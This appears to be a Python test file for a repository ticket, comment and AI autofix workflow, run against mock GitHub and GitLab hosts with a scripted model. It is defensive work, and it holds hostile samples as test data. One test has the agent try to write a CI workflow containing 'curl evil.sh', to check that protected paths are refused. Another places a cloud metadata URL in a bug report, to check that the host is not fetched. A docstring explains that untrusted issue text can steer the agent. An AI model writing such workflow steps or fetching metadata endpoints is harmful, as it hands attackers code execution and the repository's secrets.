"""git.ticket and git.autofix — the ticket-and-fix pair, against mock hosts.

Every HTTP call the nodes make is served by an httpx MockTransport that
records requests, so the assertions are about the *wire*: which endpoints,
what payloads, in what order. The fix loop's model is a FunctionModel scripted
to read, stage a write, and summarise — the loop, tools, staging and PR are
all the real code. The genuinely-live path is the standing rule in CLAUDE.md:
provider-touching nodes get their live run before shipping changes.
"""

from __future__ import annotations

import base64
import json
import uuid

import httpx
import pytest
from pydantic import ValidationError
from pydantic_ai.messages import ModelResponse, TextPart, ToolCallPart
from pydantic_ai.models.function import FunctionModel

from basivo_orch.flows.nodes.base import NodeContext, NodeError, ResolvedCredential
from basivo_orch.flows.nodes.gitops import (
    DEFAULT_PROTECTED_PATHS,
    AutofixConfig,
    AutofixNode,
    CommentConfig,
    CommentNode,
    TicketConfig,
    TicketNode,
    is_protected,
)


class _Recorder:
    def __init__(self) -> None:
        self.steps: list[tuple[str, dict]] = []
        self.progress_lines: list[str] = []

    async def step(self, kind: str, data: dict) -> None:
        self.steps.append((kind, data))

    async def progress(self, message: str) -> None:
        self.progress_lines.append(message)


def make_context(
    recorder: _Recorder, http: httpx.AsyncClient, *, git_provider: str = "github"
) -> NodeContext:
    async def resolve_credential(credential_id: str):
        if credential_id == "cred-git":
            return ResolvedCredential(
                provider=git_provider, api_key="ghp_test_token", base_url=None, options={}
            )
        return None

    return NodeContext(
        run_id=uuid.uuid4(),
        organization_id=uuid.uuid4(),
        node_id="fixer",
        node_name="Fixer",
        attempt=1,
        input={"error": "TypeError in billing"},
        outputs={},
        variables={},
        trigger={"payload": {}},
        progress=recorder.progress,
        step=recorder.step,
        resolve_credential=resolve_credential,
        http=http,
    )


# ---------------------------------------------------------------------------
# git.ticket
# ---------------------------------------------------------------------------


async def test_ticket_node_opens_a_github_issue_with_templated_fields():
    requests: list[httpx.Request] = []

    def handler(request: httpx.Request) -> httpx.Response:
        requests.append(request)
        assert request.url.path == "/repos/acme/api/issues"
        assert request.headers["Authorization"] == "Bearer ghp_test_token"
        return httpx.Response(
            201, json={"html_url": "https://github.com/acme/api/issues/7", "number": 7}
        )

    recorder = _Recorder()
    async with httpx.AsyncClient(transport=httpx.MockTransport(handler)) as http:
        ctx = make_context(recorder, http)
        result = await TicketNode().run(
            TicketConfig(
                git_credential_id="cred-git",
                repo="acme/api",
                title="Run failed: {{ input.error }}",
                body="Details: {{ input.error }}",
                labels=["autofix"],
            ),
            ctx,
        )

    assert result.output == {"url": "https://github.com/acme/api/issues/7", "number": 7}
    body = json.loads(requests[0].content)
    assert body["title"] == "Run failed: TypeError in billing"
    assert body["labels"] == ["autofix"]
    assert (
        "ticket.created",
        {"provider": "github", "repo": "acme/api", "url": result.output["url"], "number": 7},
    ) in recorder.steps


async def test_ticket_node_opens_a_gitlab_issue():
    def handler(request: httpx.Request) -> httpx.Response:
        # httpx decodes .path; the %2F encoding survives in raw_path, which is
        # what actually went on the wire.
        assert request.url.raw_path.decode().startswith("/api/v4/projects/group%2Fapp")
        assert request.headers["PRIVATE-TOKEN"] == "ghp_test_token"
        return httpx.Response(
            201, json={"web_url": "https://gitlab.com/group/app/-/issues/3", "iid": 3}
        )

    recorder = _Recorder()
    async with httpx.AsyncClient(transport=httpx.MockTransport(handler)) as http:
        ctx = make_context(recorder, http, git_provider="gitlab")
        result = await TicketNode().run(
            TicketConfig(
                git_provider="gitlab",
                git_credential_id="cred-git",
                repo="group/app",
                title="Broken",
            ),
            ctx,
        )

    assert result.output["number"] == 3


async def test_ticket_node_refuses_a_mismatched_credential():
    recorder = _Recorder()
    async with httpx.AsyncClient() as http:
        ctx = make_context(recorder, http, git_provider="github")
        with pytest.raises(NodeError, match="not 'gitlab'"):
            await TicketNode().run(
                TicketConfig(
                    git_provider="gitlab",
                    git_credential_id="cred-git",
                    repo="group/app",
                    title="x",
                ),
                ctx,
            )


# ---------------------------------------------------------------------------
# git.autofix
# ---------------------------------------------------------------------------


def github_repo_handler(requests: list[httpx.Request]):
    """A tiny scripted GitHub: one repo, one file, records everything."""
    file_content = base64.b64encode(b"def add(a, b):\n    return a - b\n").decode()

    def handler(request: httpx.Request) -> httpx.Response:
        requests.append(request)
        path = request.url.path
        if path.endswith("/git/ref/heads/main"):
            return httpx.Response(200, json={"object": {"sha": "base-sha-123"}})
        if "/git/trees/" in path:
            return httpx.Response(200, json={"tree": [{"path": "calc.py", "type": "blob"}]})
        if path.endswith("/contents/calc.py") and request.method == "GET":
            return httpx.Response(200, json={"content": file_content, "sha": "blob-sha-1"})
        if "/contents/" in path and request.method == "GET":
            # Any other file: does not exist yet — the probe treats 404 as
            # "new file", exactly like the real API.
            return httpx.Response(404, json={"message": "Not Found"})
        if path.endswith("/git/refs") and request.method == "POST":
            return httpx.Response(201, json={})
        if "/contents/" in path and request.method == "PUT":
            return httpx.Response(201, json={})
        if path.endswith("/pulls") and request.method == "POST":
            return httpx.Response(
                201, json={"html_url": "https://github.com/acme/api/pull/42", "number": 42}
            )
        return httpx.Response(404, json={"message": f"unexpected {request.method} {path}"})

    return handler


def scripted_fix_model():
    """A model that reads the file, stages the fix, and summarises."""
    turn = {"n": 0}

    def model(messages, info):
        turn["n"] += 1
        if turn["n"] == 1:
            return ModelResponse(
                parts=[
                    ToolCallPart(tool_name="read_file", args={"path": "calc.py"}, tool_call_id="r1")
                ]
            )
        if turn["n"] == 2:
            return ModelResponse(
                parts=[
                    ToolCallPart(
                        tool_name="write_file",
                        args={"path": "calc.py", "content": "def add(a, b):\n    return a + b\n"},
                        tool_call_id="w1",
                    )
                ]
            )
        return ModelResponse(
            parts=[TextPart(content="add() subtracted instead of adding; flipped the operator.")]
        )

    return model


async def test_autofix_stages_commits_and_opens_the_pr(monkeypatch):
    requests: list[httpx.Request] = []

    async def fake_build(ctx, **kwargs):
        return FunctionModel(scripted_fix_model())

    monkeypatch.setattr("basivo_orch.flows.nodes.agent.build_llm_model", fake_build)

    recorder = _Recorder()
    async with httpx.AsyncClient(
        transport=httpx.MockTransport(github_repo_handler(requests))
    ) as http:
        ctx = make_context(recorder, http)
        result = await AutofixNode().run(
            AutofixConfig(
                git_credential_id="cred-git",
                repo="acme/api",
                problem="add() returns the wrong result: {{ input.error }}",
            ),
            ctx,
        )

    assert result.output["pr_url"] == "https://github.com/acme/api/pull/42"
    assert result.output["files_changed"] == ["calc.py"]
    assert "flipped the operator" in result.output["summary"]

    # The wire order is the safety story: nothing repo-mutating happens before
    # the loop finishes — branch, then commit, then PR, at the very end.
    mutating = [(r.method, r.url.path) for r in requests if r.method in ("POST", "PUT")]
    assert mutating == [
        ("POST", "/repos/acme/api/git/refs"),
        ("PUT", "/repos/acme/api/contents/calc.py"),
        ("POST", "/repos/acme/api/pulls"),
    ]

    # And the step log tells the whole story in order.
    kinds = [kind for kind, _ in recorder.steps]
    assert kinds == ["fix.started", "fix.read", "fix.staged", "fix.committed", "pr.opened"]

    # The PR body carries the never-merges statement.
    pr_request = json.loads(requests[-1].content)
    assert "never merges" in pr_request["body"]


async def test_autofix_fails_loudly_when_the_agent_changes_nothing(monkeypatch):
    def timid_model(messages, info):
        return ModelResponse(parts=[TextPart(content="I could not find the cause.")])

    async def fake_build(ctx, **kwargs):
        return FunctionModel(timid_model)

    monkeypatch.setattr("basivo_orch.flows.nodes.agent.build_llm_model", fake_build)

    requests: list[httpx.Request] = []
    recorder = _Recorder()
    async with httpx.AsyncClient(
        transport=httpx.MockTransport(github_repo_handler(requests))
    ) as http:
        ctx = make_context(recorder, http)
        with pytest.raises(NodeError, match="changed no files"):
            await AutofixNode().run(
                AutofixConfig(git_credential_id="cred-git", repo="acme/api", problem="mystery"),
                ctx,
            )

    # An honest miss mutates nothing: no branch, no commit, no PR.
    assert not [r for r in requests if r.method in ("POST", "PUT")]


async def test_autofix_write_limit_refuses_sprawling_fixes(monkeypatch):
    def sprawling_model(messages, info):
        # Tries to write a second file; the tool must refuse, and the model's
        # next turn just finishes.
        turn = len([m for m in messages if m.kind == "response"])
        if turn == 0:
            return ModelResponse(
                parts=[
                    ToolCallPart(
                        tool_name="write_file",
                        args={"path": "a.py", "content": "x"},
                        tool_call_id="w1",
                    )
                ]
            )
        if turn == 1:
            return ModelResponse(
                parts=[
                    ToolCallPart(
                        tool_name="write_file",
                        args={"path": "b.py", "content": "y"},
                        tool_call_id="w2",
                    )
                ]
            )
        return ModelResponse(parts=[TextPart(content="done")])

    async def fake_build(ctx, **kwargs):
        return FunctionModel(sprawling_model)

    monkeypatch.setattr("basivo_orch.flows.nodes.agent.build_llm_model", fake_build)

    requests: list[httpx.Request] = []
    recorder = _Recorder()
    async with httpx.AsyncClient(
        transport=httpx.MockTransport(github_repo_handler(requests))
    ) as http:
        ctx = make_context(recorder, http)
        result = await AutofixNode().run(
            AutofixConfig(
                git_credential_id="cred-git", repo="acme/api", problem="fix", max_files=1
            ),
            ctx,
        )

    # Only the first write was staged; the second was refused, not silently taken.
    assert result.output["files_changed"] == ["a.py"]


def test_autofix_config_rejects_a_bare_repo_name():
    with pytest.raises(ValidationError, match="owner/name"):
        AutofixConfig(git_credential_id="c", repo="api", problem="x")


# ---------------------------------------------------------------------------
# git.comment — closing the loop back to the reporter
# ---------------------------------------------------------------------------


async def test_comment_node_replies_on_the_issue_it_was_given():
    requests: list[httpx.Request] = []

    def handler(request: httpx.Request) -> httpx.Response:
        requests.append(request)
        assert request.url.path == "/repos/acme/api/issues/7/comments"
        return httpx.Response(
            201,
            json={"html_url": "https://github.com/acme/api/issues/7#issuecomment-1", "id": 1},
        )

    recorder = _Recorder()
    async with httpx.AsyncClient(transport=httpx.MockTransport(handler)) as http:
        ctx = make_context(recorder, http)
        result = await CommentNode().run(
            CommentConfig(
                git_credential_id="cred-git",
                repo="acme/api",
                issue_number="7",
                body="Opened a PR for this: {{ input.error }}",
            ),
            ctx,
        )

    assert result.output["id"] == 1
    assert json.loads(requests[0].content)["body"] == "Opened a PR for this: TypeError in billing"
    assert any(kind == "comment.posted" for kind, _ in recorder.steps)


async def test_comment_node_templates_the_issue_number_from_the_trigger():
    """The number arrives as `{{ trigger.payload.body.issue.number }}` — a
    string after rendering, an int on the wire."""
    seen: list[str] = []

    def handler(request: httpx.Request) -> httpx.Response:
        seen.append(request.url.path)
        return httpx.Response(201, json={"html_url": "u", "id": 2})

    recorder = _Recorder()
    async with httpx.AsyncClient(transport=httpx.MockTransport(handler)) as http:
        ctx = make_context(recorder, http)
        ctx.trigger["payload"] = {"body": {"issue": {"number": 42}}}
        await CommentNode().run(
            CommentConfig(
                git_credential_id="cred-git",
                repo="acme/api",
                issue_number="{{ trigger.payload.body.issue.number }}",
                body="hi",
            ),
            ctx,
        )

    assert seen == ["/repos/acme/api/issues/42/comments"]


async def test_comment_node_says_so_when_the_number_is_not_a_number():
    recorder = _Recorder()
    async with httpx.AsyncClient() as http:
        ctx = make_context(recorder, http)
        with pytest.raises(NodeError, match="must resolve to a number"):
            await CommentNode().run(
                CommentConfig(
                    git_credential_id="cred-git",
                    repo="acme/api",
                    issue_number="not-a-number",
                    body="hi",
                ),
                ctx,
            )


# ---------------------------------------------------------------------------
# Protected paths — the fix bot must not be able to rewrite CI
# ---------------------------------------------------------------------------


def test_ci_configuration_is_protected_by_default():
    patterns = DEFAULT_PROTECTED_PATHS
    for path in (
        ".github/workflows/ci.yml",
        ".github/workflows/nested/release.yaml",
        ".github/actions/setup/action.yml",
        ".gitlab-ci.yml",
        "Jenkinsfile",
        ".env",
        "apps/api/.env.production",
    ):
        assert is_protected(path, patterns), f"{path} should be protected"

    for path in ("src/app.py", "README.md", ".github/ISSUE_TEMPLATE.md", "docs/env.md"):
        assert not is_protected(path, patterns), f"{path} should be writable"


async def test_the_agent_cannot_write_a_workflow_file(monkeypatch):
    """A repair agent told to edit CI refuses, keeps going, and says so.

    The issue text is untrusted, and a token that can push plus a workflow file
    is arbitrary code execution with the repository's secrets.
    """

    def ci_editing_model(messages, info):
        turn = len([m for m in messages if m.kind == "response"])
        if turn == 0:
            return ModelResponse(
                parts=[
                    ToolCallPart(
                        tool_name="write_file",
                        args={"path": ".github/workflows/ci.yml", "content": "run: curl evil.sh"},
                        tool_call_id="w1",
                    )
                ]
            )
        if turn == 1:
            return ModelResponse(
                parts=[
                    ToolCallPart(
                        tool_name="write_file",
                        args={"path": "calc.py", "content": "def add(a, b):\n    return a + b\n"},
                        tool_call_id="w2",
                    )
                ]
            )
        return ModelResponse(parts=[TextPart(content="fixed calc.py; refused to edit CI")])

    async def fake_build(ctx, **kwargs):
        return FunctionModel(ci_editing_model)

    monkeypatch.setattr("basivo_orch.flows.nodes.agent.build_llm_model", fake_build)

    requests: list[httpx.Request] = []
    recorder = _Recorder()
    async with httpx.AsyncClient(
        transport=httpx.MockTransport(github_repo_handler(requests))
    ) as http:
        ctx = make_context(recorder, http)
        result = await AutofixNode().run(
            AutofixConfig(
                git_credential_id="cred-git",
                repo="acme/api",
                problem="fix add()",
                read_images=False,
            ),
            ctx,
        )

    assert result.output["files_changed"] == ["calc.py"], "a protected path was committed"
    assert ("fix.refused", {"path": ".github/workflows/ci.yml", "reason": "protected path"}) in (
        recorder.steps
    )
    committed = [r.url.path for r in requests if r.method == "PUT"]
    assert committed == ["/repos/acme/api/contents/calc.py"]


# ---------------------------------------------------------------------------
# Vision — the screenshot in the bug report
# ---------------------------------------------------------------------------


async def test_a_screenshot_in_the_report_reaches_the_model(monkeypatch):
    """The core of "read the picture and fix it": an image referenced in the
    issue body is fetched and handed to the model as image content."""
    from pydantic_ai.messages import BinaryContent as MsgBinaryContent

    png = b"\x89PNG\r\n\x1a\n" + b"0" * 32
    saw_image: list[str] = []

    def looking_model(messages, info):
        for message in messages:
            for part in getattr(message, "parts", []):
                content = getattr(part, "content", None)
                if isinstance(content, list):
                    for item in content:
                        if isinstance(item, MsgBinaryContent):
                            saw_image.append(item.media_type)
        turn = len([m for m in messages if m.kind == "response"])
        if turn == 0:
            return ModelResponse(
                parts=[
                    ToolCallPart(
                        tool_name="write_file",
                        args={"path": "calc.py", "content": "def add(a, b):\n    return a + b\n"},
                        tool_call_id="w1",
                    )
                ]
            )
        return ModelResponse(parts=[TextPart(content="The screenshot showed add() returning -1.")])

    async def fake_build(ctx, **kwargs):
        return FunctionModel(looking_model)

    monkeypatch.setattr("basivo_orch.flows.nodes.agent.build_llm_model", fake_build)

    requests: list[httpx.Request] = []
    repo = github_repo_handler(requests)

    def handler(request: httpx.Request) -> httpx.Response:
        if request.url.host in ("github.com", "private-user-images.githubusercontent.com"):
            if request.url.host == "github.com" and "/user-attachments/" in request.url.path:
                return httpx.Response(
                    302,
                    headers={
                        "location": "https://private-user-images.githubusercontent.com/1/s.png"
                    },
                )
            return httpx.Response(200, content=png, headers={"content-type": "image/png"})
        return repo(request)

    recorder = _Recorder()
    async with httpx.AsyncClient(transport=httpx.MockTransport(handler)) as http:
        ctx = make_context(recorder, http)
        result = await AutofixNode().run(
            AutofixConfig(
                git_credential_id="cred-git",
                repo="acme/api",
                problem=(
                    "add() is wrong, see the screenshot:\n\n"
                    "![bug](https://github.com/user-attachments/assets/abc)"
                ),
            ),
            ctx,
        )

    # Present on every model turn, because the conversation history carries it.
    assert set(saw_image) == {"image/png"}, "the model never received the screenshot"
    assert result.output["pr_url"].endswith("/pull/42")
    assert any(kind == "fix.image" for kind, _ in recorder.steps)


async def test_an_image_on_an_untrusted_host_is_skipped_not_fetched(monkeypatch):
    """A bug report can point anywhere; only allowlisted hosts are fetched,
    and the run says which were skipped rather than failing silently."""

    def quiet_model(messages, info):
        turn = len([m for m in messages if m.kind == "response"])
        if turn == 0:
            return ModelResponse(
                parts=[
                    ToolCallPart(
                        tool_name="write_file",
                        args={"path": "calc.py", "content": "x = 1\n"},
                        tool_call_id="w1",
                    )
                ]
            )
        return ModelResponse(parts=[TextPart(content="done")])

    async def fake_build(ctx, **kwargs):
        return FunctionModel(quiet_model)

    monkeypatch.setattr("basivo_orch.flows.nodes.agent.build_llm_model", fake_build)

    requests: list[httpx.Request] = []
    repo = github_repo_handler(requests)

    def handler(request: httpx.Request) -> httpx.Response:
        if request.url.host not in ("api.github.com", "test"):
            raise AssertionError(f"fetched a disallowed host: {request.url}")
        return repo(request)

    recorder = _Recorder()
    async with httpx.AsyncClient(transport=httpx.MockTransport(handler)) as http:
        ctx = make_context(recorder, http)
        await AutofixNode().run(
            AutofixConfig(
                git_credential_id="cred-git",
                repo="acme/api",
                problem="see ![x](http://169.254.169.254/latest/meta-data/)",
            ),
            ctx,
        )

    skipped = [data for kind, data in recorder.steps if kind == "fix.image_skipped"]
    assert skipped and skipped[0]["reason"] == "host not allowed"
